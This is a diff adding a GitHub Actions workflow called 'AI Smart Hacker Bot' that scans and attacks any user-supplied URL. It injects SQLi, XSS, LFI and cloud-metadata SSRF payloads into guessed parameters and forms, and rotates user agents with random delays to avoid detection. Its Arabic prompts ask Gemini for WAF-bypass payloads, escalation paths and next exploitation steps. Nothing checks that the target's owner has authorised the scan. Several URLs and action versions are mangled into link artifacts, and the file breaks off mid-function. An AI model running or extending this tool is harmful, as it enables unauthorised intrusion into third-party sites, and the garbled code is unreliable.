@@ -1,0 +1,787 @@
+name: AI Smart Hacker Bot
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL'
+        required: true
+        default: '[https://example.com](https://example.com)'
+      intelligence_level:
+        description: 'AI Intelligence Level'
+        required: true
+        default: 'adaptive'
+        type: choice
+        options:
+          - learning
+          - adaptive
+          - expert
+          - autonomous
+
+env:
+  TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+  GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+
+jobs:
+  ai-smart-hacker:
+    runs-on: ubuntu-latest
+    timeout-minutes: 240
+    
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout[v3](cci:4://file://v3:0:0-0:0)
+
+      - name: Setup Python with AI Libraries
+        uses: actions/setup-python[v4](cci:4://file://v4:0:0-0:0)
+        with:
+          python-version: '3.10'
+
+      - name: Install AI and Security Tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3-pip git curl wget chromium-browser chromium-chromedriver
+          
+          # Install AI/ML libraries
+          pip install google-generativeai
+          pip install tensorflow keras scikit-learn
+          pip install selenium beautifulsoup4 requests
+          pip install playwright asyncio aiohttp
+          pip install python-whois dnspython
+          
+          # Install security tools
+          pip install sqlmap-python paramiko scapy
+          
+          # Install Playwright browsers
+          playwright install chromium
+          
+          # Install Nuclei
+          wget -q [https://github.com/projectdiscovery/nuclei/releases/download/v3.1.0/nuclei_3.1.0_linux_amd64.zip](https://github.com/projectdiscovery/nuclei/releases/download/v3.1.0/nuclei_3.1.0_linux_amd64.zip)
+          unzip -o -q nuclei_3.1.0_linux_amd64.zip nuclei
+          sudo mv nuclei /usr/local/bin/
+          rm -f nuclei_3.1.0_linux_amd64.zip
+
+      - name: Create AI Bot Structure
+        run: |
+          mkdir -p ai-bot/{brain,memory,attacks,reports}
+          echo "AI Smart Hacker Bot initialized" | tee ai-bot/bot.log
+
+      - name: AI Brain - Reconnaissance Module
+        run: |
+          cat > ai-bot/brain/recon_ai.py << 'PYEOF'
+          import requests
+          import json
+          import time
+          import random
+          from bs4 import BeautifulSoup
+          from urllib.parse import urljoin, urlparse
+          import re
+          
+          class AIReconBot:
+              def __init__(self, target):
+                  self.target = target
+                  self.discovered = {
+                      'urls': set(),
+                      'forms': [],
+                      'apis': [],
+                      'technologies': [],
+                      'vulnerabilities': []
+                  }
+                  self.user_agents = [
+                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+                  ]
+              
+              def think_like_human(self):
+                  """Simulate human-like delays"""
+                  time.sleep(random.uniform(1, 3))
+              
+              def smart_crawl(self, max_depth=3):
+                  """Intelligent crawling with AI decision making"""
+                  print(f"[AI] Starting intelligent reconnaissance on {self.target}")
+                  
+                  visited = set()
+                  to_visit = [(self.target, 0)]
+                  
+                  while to_visit:
+                      url, depth = to_visit.pop(0)
+                      
+                      if url in visited or depth > max_depth:
+                          continue
+                      
+                      visited.add(url)
+                      self.think_like_human()
+                      
+                      try:
+                          headers = {'User-Agent': random.choice(self.user_agents)}
+                          response = requests.get(url, headers=headers, timeout=10, verify=False)
+                          
+                          # Analyze response
+                          self.analyze_response(url, response)
+                          
+                          # Extract links
+                          soup = BeautifulSoup(response.text, 'html.parser')
+                          for link in soup.find_all('a', href=True):
+                              next_url = urljoin(url, link['href'])
+                              if self.is_interesting(next_url):
+                                  to_visit.append((next_url, depth + 1))
+                          
+                      except Exception as e:
+                          print(f"[AI] Error crawling {url}: {e}")
+                  
+                  return self.discovered
+              
+              def is_interesting(self, url):
+                  """AI decides if URL is worth exploring"""
+                  interesting_keywords = ['admin', 'api', 'login', 'upload', 'config', 
+                                         'dashboard', 'panel', 'user', 'account', 'settings']
+                  
+                  parsed = urlparse(url)
+                  if parsed.netloc != urlparse(self.target).netloc:
+                      return False
+                  
+                  url_lower = url.lower()
+                  return any(keyword in url_lower for keyword in interesting_keywords)
+              
+              def analyze_response(self, url, response):
+                  """Analyze response for vulnerabilities"""
+                  # Detect forms
+                  soup = BeautifulSoup(response.text, 'html.parser')
+                  forms = soup.find_all('form')
+                  for form in forms:
+                      self.discovered['forms'].append({
+                          'url': url,
+                          'action': form.get('action'),
+                          'method': form.get('method'),
+                          'inputs': [inp.get('name') for inp in form.find_all('input')]
+                      })
+                  
+                  # Detect APIs
+                  api_patterns = [r'/api/v\d+/', r'/rest/', r'/graphql', r'\.json']
+                  for pattern in api_patterns:
+                      if re.search(pattern, url):
+                          self.discovered['apis'].append(url)
+                  
+                  # Detect technologies
+                  headers = response.headers
+                  if 'X-Powered-By' in headers:
+                      self.discovered['technologies'].append(headers['X-Powered-By'])
+                  
+                  # Check for common vulnerabilities
+                  if 'root:' in response.text or 'bin/bash' in response.text:
+                      self.discovered['vulnerabilities'].append({
+                          'type': 'LFI',
+                          'url': url,
+                          'evidence': 'File disclosure detected'
+                      })
+                  
+                  print(f"[AI] Analyzed: {url}")
+              
+              def generate_report(self):
+                  """Generate intelligent report"""
+                  report = {
+                      'target': self.target,
+                      'urls_discovered': len(self.discovered['urls']),
+                      'forms_found': len(self.discovered['forms']),
+                      'apis_found': len(self.discovered['apis']),
+                      'technologies': list(set(self.discovered['technologies'])),
+                      'vulnerabilities': self.discovered['vulnerabilities']
+                  }
+                  
+                  with open('ai-bot/memory/recon_results.json', 'w') as f:
+                      json.dump(report, f, indent=2)
+                  
+                  return report
+          
+          if __name__ == "__main__":
+              import sys
+              target = sys.argv[1] if len(sys.argv) > 1 else "[https://example.com](https://example.com)"
+              
+              bot = AIReconBot(target)
+              results = bot.smart_crawl(max_depth=2)
+              report = bot.generate_report()
+              
+              print("\n[AI] Reconnaissance Complete!")
+              print(f"URLs: {report['urls_discovered']}")
+              print(f"Forms: {report['forms_found']}")
+              print(f"APIs: {report['apis_found']}")
+              print(f"Vulnerabilities: {len(report['vulnerabilities'])}")
+          PYEOF
+          
+          python3 ai-bot/brain/recon_ai.py "${{ github.event.inputs.target_url }}" || true
+
+      - name: AI Brain - Vulnerability Analysis with Gemini
+        if: env.GEMINI_API_KEY != ''
+        run: |
+          cat > ai-bot/brain/gemini_analyzer.py << 'PYEOF'
+          import google.generativeai as genai
+          import json
+          import os
+          
+          class GeminiVulnerabilityAnalyzer:
+              def __init__(self, api_key):
+                  genai.configure(api_key=api_key)
+                  self.model = genai.GenerativeModel('gemini-pro')
+              
+              def analyze_with_gemini(self, target_info):
+                  """Use Gemini to analyze and suggest attacks"""
+                  
+                  prompt = f"""
+                  أنت خبير أمن سيبراني وهاكر أخلاقي محترف. قم بتحليل الهدف التالي واقترح الثغرات المحتملة:
+                  
+                  الهدف: {target_info.get('target')}
+                  التقنيات المستخدمة: {', '.join(target_info.get('technologies', []))}
+                  النماذج المكتشفة: {target_info.get('forms_found')}
+                  APIs المكتشفة: {target_info.get('apis_found')}
+                  
+                  قدم:
+                  1. أفضل 5 ثغرات محتملة مع التفاصيل
+                  2. طرق الهجوم المحددة لكل ثغرة
+                  3. Payloads موصى بها لكل ثغرة
+                  4. ترتيب الأولوية للاختبار
+                  5. نصائح لتجاوز WAF
+                  
+                  قدم الإجابة بتنسيق JSON مع المفاتيح: vulnerabilities, attack_vectors, payloads, priority, waf_bypass_tips
+                  """
+                  
+                  try:
+                      response = self.model.generate_content(prompt)
+                      analysis = response.text
+                      
+                      # Save analysis
+                      with open('ai-bot/memory/gemini_analysis.txt', 'w', encoding='utf-8') as f:
+                          f.write(analysis)
+                      
+                      print("[Gemini] ✅ التحليل اكتمل!")
+                      print(analysis)
+                      
+                      return analysis
+                      
+                  except Exception as e:
+                      print(f"[Gemini] ❌ خطأ: {e}")
+                      return None
+              
+              def generate_custom_payloads(self, vulnerability_type, target_tech=""):
+                  """Generate custom payloads using Gemini"""
+                  
+                  prompt = f"""
+                  أنشئ 15 payload متقدم لثغرة {vulnerability_type} تتميز بـ:
+                  
+                  1. تجاوز قواعد WAF الشائعة (ModSecurity, Cloudflare, AWS WAF)
+                  2. استخدام Encoding/Obfuscation متقدم
+                  3. Context-aware حسب التقنية: {target_tech}
+                  4. تقنيات حديثة 2024-2025
+                  5. Unicode bypass
+                  6. Double encoding
+                  7. Case variation
+                  8. Comment injection
+                  
+                  أعطني فقط الـ payloads، واحد في كل سطر، بدون شرح.
+                  """
+                  
+                  try:
+                      response = self.model.generate_content(prompt)
+                      payloads = response.text.strip().split('\n')
+                      clean_payloads = [p.strip() for p in payloads if p.strip() and not p.startswith('#')]
+                      
+                      print(f"[Gemini] ✅ تم توليد {len(clean_payloads)} payload لـ {vulnerability_type}")
+                      return clean_payloads
+                      
+                  except Exception as e:
+                      print(f"[Gemini] ❌ خطأ في توليد payloads: {e}")
+                      return []
+              
+              def suggest_next_steps(self, findings):
+                  """AI suggests next attack steps based on findings"""
+                  
+                  prompt = f"""
+                  بناءً على الثغرات المكتشفة التالية:
+                  {json.dumps(findings, indent=2, ensure_ascii=False)}
+                  
+                  اقترح:
+                  1. الخطوات التالية للاستغلال
+                  2. كيفية توسيع الهجوم
+                  3. ثغرات إضافية محتملة
+                  4. طرق الحصول على صلاحيات أعلى
+                  """
+                  
+                  try:
+                      response = self.model.generate_content(prompt)
+                      suggestions = response.text
+                      
+                      with open('ai-bot/memory/next_steps.txt', 'w', encoding='utf-8') as f:
+                          f.write(suggestions)
+                      
+                      print("[Gemini] 🎯 اقتراحات الخطوات التالية جاهزة!")
+                      return suggestions
+                      
+                  except Exception as e:
+                      print(f"[Gemini] خطأ: {e}")
+                      return None
+          
+          if __name__ == "__main__":
+              api_key = os.getenv('GEMINI_API_KEY')
+              if not api_key:
+                  print("[Gemini] ❌ لم يتم توفير API key")
+                  exit(0)
+              
+              print("[Gemini] 🚀 بدء التحليل الذكي...")
+              
+              # Load recon results
+              try:
+                  with open('ai-bot/memory/recon_results.json', 'r') as f:
+                      recon_data = json.load(f)
+              except:
+                  recon_data = {'target': '${{ github.event.inputs.target_url }}'}
+              
+              analyzer = GeminiVulnerabilityAnalyzer(api_key)
+              
+              # Analyze target
+              analysis = analyzer.analyze_with_gemini(recon_data)
+              
+              # Generate custom payloads for top vulnerabilities
+              vuln_types = [
+                  ('SQL Injection', 'MySQL/PostgreSQL'),
+                  ('XSS', 'JavaScript'),
+                  ('XXE', 'XML Parser'),
+                  ('SSRF', 'HTTP Client'),
+                  ('Command Injection', 'Linux/Windows'),
+                  ('LFI', 'PHP/Node.js')
+              ]
+              
+              for vuln, tech in vuln_types:
+                  payloads = analyzer.generate_custom_payloads(vuln, tech)
+                  if payloads:
+                      filename = f'ai-bot/attacks/{vuln.lower().replace(" ", "_")}_payloads.txt'
+                      with open(filename, 'w', encoding='utf-8') as f:
+                          f.write('\n'.join(payloads))
+              
+              print("[Gemini] ✅ التحليل والـ payloads جاهزة!")
+          PYEOF
+          
+          python3 ai-bot/brain/gemini_analyzer.py || true
+
+      - name: AI Brain - Smart Attack Execution
+        run: |
+          cat > ai-bot/brain/smart_attacker.py << 'PYEOF'
+          import requests
+          import json
+          import time
+          import random
+          from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+          
+          class SmartAttacker:
+              def __init__(self, target):
+                  self.target = target
+                  self.session = requests.Session()
+                  self.findings = []
+                  self.attack_patterns = {
+                      'sqli': ["'", "' OR '1'='1", "' UNION SELECT NULL--", "admin'--"],
+                      'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
+                      'lfi': ["../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"],
+                      'ssrf': ["[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"]
+                  }
+              
+              def human_like_behavior(self):
+                  """Simulate human behavior"""
+                  # Random delay
+                  time.sleep(random.uniform(2, 5))
+                  
+                  # Random user agent
+                  user_agents = [
+                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+                      'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)'
+                  ]
+                  self.session.headers.update({
+                      'User-Agent': random.choice(user_agents),
+                      'Accept-Language': 'en-US,en;q=0.9',
+                      'Accept': 'text/html,application/json'
+                  })
+              
+              def intelligent_parameter_discovery(self, url):
+                  """Discover parameters intelligently"""
+                  common_params = [
+                      'id', 'user', 'page', 'file', 'path', 'url', 'redirect',
+                      'q', 'search', 'query', 'keyword', 'cat', 'category',
+                      'lang', 'locale', 'debug', 'test', 'admin'
+                  ]
+                  
+                  discovered_params = []
+                  
+                  for param in common_params:
+                      self.human_like_behavior()
+                      test_url = f"{url}?{param}=test"
+                      
+                      try:
+                          resp = self.session.get(test_url, timeout=10)
+                          
+                          # Check if parameter is reflected or causes different response
+                          if 'test' in resp.text or resp.status_code != 404:
+                              discovered_params.append(param)
+                              print(f"[AI] Discovered parameter: {param}")
+                      
+                      except:
+                          continue
+                  
+                  return discovered_params
+              
+              def adaptive_attack(self, url, param, attack_type):
+                  """Adaptively attack based on responses"""
+                  payloads = self.attack_patterns.get(attack_type, [])
+                  
+                  for payload in payloads:
+                      self.human_like_behavior()
+                      
+                      test_url = f"{url}?{param}={payload}"
+                      
+                      try:
+                          resp = self.session.get(test_url, timeout=10)
+                          
+                          # Intelligent response analysis
+                          if self.is_vulnerable(resp, attack_type, payload):
+                              finding = {
+                                  'type': attack_type,
+                                  'url': test_url,
+                                  'parameter': param,
+                                  'payload': payload,
+                                  'evidence': resp.text[:200]
+                              }
+                              self.findings.append(finding)
+                              print(f"[AI] 🎯 VULNERABILITY FOUND: {attack_type} in {param}")
+                              
+                              # Stop after finding vulnerability (smart behavior)
+                              break
+                      
+                      except Exception as e:
+                          continue
+              
+              def is_vulnerable(self, response, attack_type, payload):
+                  """Intelligent vulnerability detection"""
+                  indicators = {
+                      'sqli': ['sql', 'mysql', 'syntax', 'database', 'error'],
+                      'xss': ['<script>', 'alert(', 'onerror='],
+                      'lfi': ['root:', 'bin/bash', '[extensions]'],
+                      'ssrf': ['ami-id', 'instance-id', 'metadata']
+                  }
+                  
+                  text_lower = response.text.lower()
+                  
+                  for indicator in indicators.get(attack_type, []):
+                      if indicator in text_lower:
+                          return True
+                  
+                  return False
+              
+              def execute_smart_scan(self):
+                  """Execute intelligent scanning"""
+                  print(f"[AI] Starting smart attack on {self.target}")
+                  
+                  # Discover parameters
+                  params = self.intelligent_parameter_discovery(self.target)
+                  
+                  # Attack each parameter
+                  for param in params:
+                      for attack_type in ['sqli', 'xss', 'lfi', 'ssrf']:
+                          self.adaptive_attack(self.target, param, attack_type)
+                  
+                  # Save findings
+                  with open('ai-bot/memory/attack_findings.json', 'w') as f:
+                      json.dump(self.findings, f, indent=2)
+                  
+                  print(f"\n[AI] Scan complete! Found {len(self.findings)} vulnerabilities")
+                  return self.findings
+          
+          if __name__ == "__main__":
+              import sys
+              target = sys.argv[1] if len(sys.argv) > 1 else "[https://example.com](https://example.com)"
+              
+              attacker = SmartAttacker(target)
+              findings = attacker.execute_smart_scan()
+              
+              for finding in findings:
+                  print(f"\n🎯 {finding['type'].upper()}")
+                  print(f"   URL: {finding['url']}")
+                  print(f"   Payload: {finding['payload']}")
+          PYEOF
+          
+          python3 ai-bot/brain/smart_attacker.py "${{ github.event.inputs.target_url }}" || true
+
+      - name: AI Brain - Behavioral Learning
+        run: |
+          cat > ai-bot/brain/learning_engine.py << 'PYEOF'
+          import json
+          import pickle
+          from datetime import datetime
+          
+          class LearningEngine:
+              def __init__(self):
+                  self.knowledge_base = {
+                      'successful_attacks': [],
+                      'failed_attacks': [],
+                      'target_patterns': {},
+                      'waf_bypasses': []
+                  }
+              
+              def learn_from_results(self):
+                  """Learn from attack results"""
+                  try:
+                      with open('ai-bot/memory/attack_findings.json', 'r') as f:
+                          findings = json.load(f)
+                      
+                      for finding in findings:
+                          self.knowledge_base['successful_attacks'].append({
+                              'type': finding['type'],
+                              'payload': finding['payload'],
+                              'timestamp': datetime.now().isoformat()
+                          })
+                      
+                      print(f"[AI] Learned from {len(findings)} successful attacks")
+                      
+                  except:
+                      print("[AI] No findings to learn from")
+                  
+                  # Save knowledge
+                  with open('ai-bot/memory/knowledge_base.json', 'w') as f:
+                      json.dump(self.knowledge_base, f, indent=2)
+              
+              def suggest_next_attack(self):
+                  """AI suggests next attack based on learning"""
+                  if self.knowledge_base['successful_attacks']:
+                      most_successful = max(
+                          set([a['type'] for a in self.knowledge_base['successful_attacks']]),
+                          key=lambda x: sum(1 for a in self.knowledge_base['successful_attacks'] if a['type'] == x)
+                      )
+                      print(f"[AI] Suggestion: Focus on {most_successful} attacks")
+                      return most_successful
+                  
+                  return "sqli"  # Default
+          
+          if __name__ == "__main__":
+              engine = LearningEngine()
+              engine.learn_from_results()
+              suggestion = engine.suggest_next_attack()
+          PYEOF
+          
+          python3 ai-bot/brain/learning_engine.py || true
+
+      - name: AI Brain - Advanced Browser Automation
+        run: |
+          cat > ai-bot/brain/browser_bot.py << 'PYEOF'
+          from selenium import webdriver
+          from selenium.webdriver.chrome.options import Options
+          from selenium.webdriver.common.by import By
+          from selenium.webdriver.support.ui import WebDriverWait
+          from selenium.webdriver.support import expected_conditions as EC
+          import time
+          import random
+          import json
+          
+          class BrowserBot:
+              def __init__(self, target):
+                  self.target = target
+                  self.setup_browser()
+                  self.interactions = []
+              
+              def setup_browser(self):
+                  """Setup headless browser"""
+                  options = Options()
+                  options.add_argument('--headless')
+                  options.add_argument('--no-sandbox')
+                  options.add_argument('--disable-dev-shm-usage')
+                  options.add_argument('--disable-gpu')
+                  options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+                  
+                  self.driver = webdriver.Chrome(options=options)
+              
+              def human_like_mouse_movement(self):
+                  """Simulate human mouse movement"""
+                  time.sleep(random.uniform(0.5, 2))
+              
+              def intelligent_form_filling(self):
+                  """Fill forms intelligently"""
+                  try:
+                      self.driver.get(self.target)
+                      time.sleep(2)
+                      
+                      # Find all forms
+                      forms = self.driver.find_elements(By.TAG_NAME, 'form')
+                      
+                      for form in forms:
+                          inputs = form.find_elements(By.TAG_NAME, 'input')
+                          
+                          for inp in inputs:
+                              input_type = inp.get_attribute('type')
+                              input_name = inp.get_attribute('name')
+                              
+                              self.human_like_mouse_movement()
+                              
+                              # Smart input based on field type
+                              if input_type == 'email':
+                                  inp.send_keys('test[example.com')](cci:4://file://example.com'):0:0-0:0)
+                              elif input_type == 'password':
+                                  inp.send_keys('Test123!')
+                              elif input_type == 'text':
+                                  if 'user' in input_name.lower():
+                                      inp.send_keys('admin')
+                                  else:
+                                      inp.send_keys("' OR '1'='1")  # Test SQLi
+                              
+                              self.interactions.append({
+                                  'type': 'input',
+                                  'field': input_name,
+                                  'value': inp.get_attribute('value')
+                              })
+                          
+                          # Try to submit
+                          try:
+                              submit_btn = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
+                              submit_btn.click()
+                              time.sleep(2)
+                              
+                              # Check for errors or success
+                              page_source = self.driver.page_source
+                              if 'error' in page_source.lower() or 'sql' in page_source.lower():
+                                  print("[AI] 🎯 Potential vulnerability in form!")
+                          except:
+                              pass
+                      
+                      # Save interactions
+                      with open('ai-bot/memory/browser_interactions.json', 'w') as f:
+                          json.dump(self.interactions, f, indent=2)
+                      
+                  except Exception as e:
+                      print(f"[AI] Browser error: {e}")
+                  
+                  finally:
+                      self.driver.quit()
+          
+          if __name__ == "__main__":
+              import sys
+              target = sys.argv[1] if len(sys.argv) > 1 else "[https://example.com](https://example.com)"
+              
+              bot = BrowserBot(target)
+              bot.intelligent_form_filling()
+              print("[AI] Browser automation complete!")
+          PYEOF
+          
+          python3 ai-bot/brain/browser_bot.py "${{ github.event.inputs.target_url }}" || true
+
+      - name: AI Brain - Generate Intelligence Report
+        run: |
+          cat > ai-bot/brain/report_generator.py << 'PYEOF'
+          import json
+          from datetime import datetime
+          
+          class IntelligentReportGenerator:
+              def __init__(self, target):
+                  self.target = target
+                  self.report = []
+              
+              def load_all_data(self):
+                  """Load all collected data"""
+                  data = {}
+                  
+                  files = {
+                      'recon': 'ai-bot/memory/recon_results.json',
+                      'attacks': 'ai-bot/memory/attack_findings.json',
+                      'knowledge': 'ai-bot/memory/knowledge_base.json',
+                      'browser': 'ai-bot/memory/browser_interactions.json'
+                  }
+                  
+                  for key, filepath in files.items():
+                      try:
+                          with open(filepath, 'r') as f:
+                              data[key] = json.load(f)
+                      except:
+                          data[key] = {}
+                  
+                  return data
+              
+              def generate_html_report(self):
+                  """Generate beautiful HTML report"""
+                  data = self.load_all_data()
+                  
+                  html = f"""
+                  <html>
+                  <head>
+                      <title>AI Smart Hacker Report - {self.target}</title>
+                      <style>
+                          body {{ font-family: Arial; background: #0a0e27; color: #00ff00; }}
+                          .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
+                          .header {{ text-align: center; border-bottom: 2px solid #00ff00; padding: 20px; }}
+                          .section {{ background: #1a1e3a; margin: 20px 0; padding: 20px; border-radius: 10px; }}
+                          .vuln {{ background: #ff0000; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }}
+                          .success {{ background: #00ff00; color: black; padding: 10px; margin: 10px 0; border-radius: 5px; }}
+                      </style>
+                  </head>
+                  <body>
+                      <div class="container">
+                          <div class="header">
+                              <h1>🤖 AI Smart Hacker Bot Report</h1>
+                              <p>Target: {self.target}</p>
+                              <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+                          </div>
+                          
+                          <div class="section">
+                              <h2>🧠 Intelligence Summary</h2>
+                              <p>URLs Discovered: {data.get('recon', {}).get('urls_discovered', 0)}</p>
+                              <p>Forms Found: {data.get('recon', {}).get('forms_found', 0)}</p>
+                              <p>APIs Found: {data.get('recon', {}).get('apis_found', 0)}</p>
+                              <p>Vulnerabilities: {len(data.get('attacks', []))}</p>
+                          </div>
+                          
+                          <div class="section">
+                              <h2>🎯 Vulnerabilities Found</h2>
+                  """
+                  
+                  for vuln in data.get('attacks', []):
+                      html += f"""
+                      <div class="vuln">
+                          <h3>{vuln.get('type', 'Unknown').upper()}</h3>
+                          <p><strong>URL:</strong> {vuln.get('url', 'N/A')}</p>
+                          <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
+                          <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
+                      </div>
+                      """
+                  
+                  html += """
+                          </div>
+                      </div>
+                  </body>
+                  </html>
+                  """
+                  
+                  with open('ai-bot/reports/intelligence_report.html', 'w') as f:
+                      f.write(html)
+                  
+                  print("[AI] Intelligence report generated!")
+              
+              def generate_text_report(self):
+                  """Generate text report for Telegram"""
+                  data = self.load_all_data()
+                  
+                  report = f"""
+<b>🤖 AI Smart Hacker Bot Report</b>
+
+<b>Target:</b> {self.target}
+<b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>🧠 Intelligence Summary:</b>
+- URLs Discovered: {data.get('recon', {}).get('urls_discovered', 0)}
+- Forms Found: {data.get('recon', {}).get('forms_found', 0)}
+- APIs Found: {data.get('recon', {}).get('apis_found', 0)}
+- Technologies: {', '.join(data.get('recon', {}).get('technologies', []))}
+
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>🎯 Vulnerabilities Found: {len(data.get('attacks', []))}</b>
+"""
+                  
+                  for vuln in data.get('attacks', [])[:10]:  # Top 10
+                      report += f"""
+<b>{vuln.get('type', 'Unknown').upper()}</b>
+URL: {vuln.get('url', 'N/A')[:80]}
+Payload: {vuln.get('payload', 'N/A')[:50]}
+"""
